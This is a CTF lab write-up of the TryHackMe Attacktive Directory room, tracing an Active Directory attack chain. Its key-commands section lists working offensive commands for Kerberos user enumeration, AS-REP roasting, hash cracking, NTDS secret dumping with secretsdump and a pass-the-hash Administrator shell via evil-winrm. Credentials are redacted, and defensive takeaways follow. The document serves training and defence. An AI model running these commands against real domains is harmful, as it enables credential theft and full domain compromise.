Attacktive Directory — Technical CTF Documentation

This plain-text .doc file mirrors the portfolio documentation for environments that require a Word-compatible document. For the full Markdown version, see Documentation/Attacktive_Directory_documentation.md.

Platform: TryHackMe
Lab: Attacktive Directory
Target: 10.64.145.19
Domain: spookysec.local

SUMMARY
The lab demonstrated an Active Directory attack chain beginning with Nmap reconnaissance, followed by domain and user enumeration, AS-REP roasting, offline credential recovery, SMB share enumeration, backup credential discovery, directory replication abuse, NTDS extraction, and pass-the-hash to an Administrator WinRM shell.

PUBLICATION HYGIENE
Flag values, recovered passwords, and reusable NTLM material are redacted from the portfolio version.

ATTACK CHAIN
Recon → Domain Discovery → Kerberos Enumeration → AS-REP Roasting → Offline Recovery → SMB → Backup Credential → Replication Abuse → NTDS Extraction → Pass-the-Hash → Administrator Access

KEY COMMANDS
nmap -Pn -A -p- -T4 10.64.145.19
crackmapexec smb 10.64.145.19
kerbrute userenum -d spookysec.local --dc 10.64.145.19 users.txt
python3.9 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -dc-ip 10.64.145.19 -usersfile valid_users.txt -request
hashcat -m 18200 Hash.txt passwords.txt
netexec smb 10.64.145.19 -u 'svc-admin' -p '<REDACTED>' --shares
smbclient //10.64.145.19/backup -U 'svc-admin'
secretsdump.py spookysec.local/backup:<REDACTED>@10.64.145.19
evil-winrm -i 10.64.145.19 -u 'Administrator' -H '<REDACTED_NTLM_HASH>'

DEFENSIVE TAKEAWAYS
1. Enforce Kerberos preauthentication where appropriate.
2. Remove credential artifacts from readable shares.
3. Audit directory replication permissions.
4. Minimize NTLM exposure and monitor pass-the-hash indicators.
5. Correlate Kerberos, SMB, replication and WinRM telemetry.

FLAG LOCATIONS
svc-admin: C:\Users\svc-admin\Desktop\user.txt.txt
backup: C:\Users\backup\Desktop\PrivEsc.txt
Administrator: C:\Users\Administrator\Desktop\root.txt

